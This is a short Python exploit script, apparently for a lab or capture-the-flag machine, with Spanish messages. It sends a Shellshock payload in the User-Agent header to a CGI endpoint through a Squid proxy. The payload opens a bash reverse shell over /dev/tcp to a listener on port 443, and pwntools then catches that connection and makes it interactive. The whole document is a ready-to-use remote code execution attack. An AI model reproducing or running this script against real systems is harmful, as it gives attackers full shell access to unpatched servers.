#!/usr/bin/python3 

import sys, signal, requests 
from pwn import * 

# Ctrl + c

def ctrl_c(sig, frame): 
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global vars 

url = "http://192.168.1.38/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.38:3128'}
lport = 443

# Bin 

def shell_shock(): #command 
    

    headers = {'User-Agent':'() { :; }; echo; /bin/bash -c "/bin/bash -i &>/dev/tcp/192.168.1.35/443 0>&1"'}
    #user_agent = {'User-Agent': '() { :; }; echo; %s' % (command)} 

    r = requests.get(url, headers=headers, proxies=squid_proxy)
    #print("\n\n\t(!) Output del comando: %s" % (r.text))

if __name__ == "__main__": 
    #command = input("Ingrese un comando a ejecutar: ")
    #shell_shock(command)
    try:
        threading.Thread(target=shell_shock, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se pudo establecer la conexión")
        sys.exit(1)
    else: 
        shell.interactive()
